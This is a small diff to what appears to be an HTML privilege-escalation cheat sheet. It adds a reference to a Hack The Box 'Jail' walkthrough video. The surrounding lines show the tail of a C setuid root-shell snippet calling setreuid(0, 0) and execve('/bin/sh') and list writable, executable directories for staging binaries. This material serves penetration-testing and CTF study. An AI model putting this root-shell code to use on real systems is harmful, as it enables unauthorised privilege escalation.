@@ -1064,6 +1064,8 @@ int main( int argc, char *argv[] )
 	setreuid(0, 0);
 	execve("/bin/sh", NULL, NULL);
 }
+
+#Great privilege escalation using this method is Jail HTB - https://www.youtube.com/watch?v=80-73OYcrrk&t=3851s
 </pre>
 <p><font size="3.5" color="black">Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm</font></p>
 <pre style="background-color:black;color:white;">
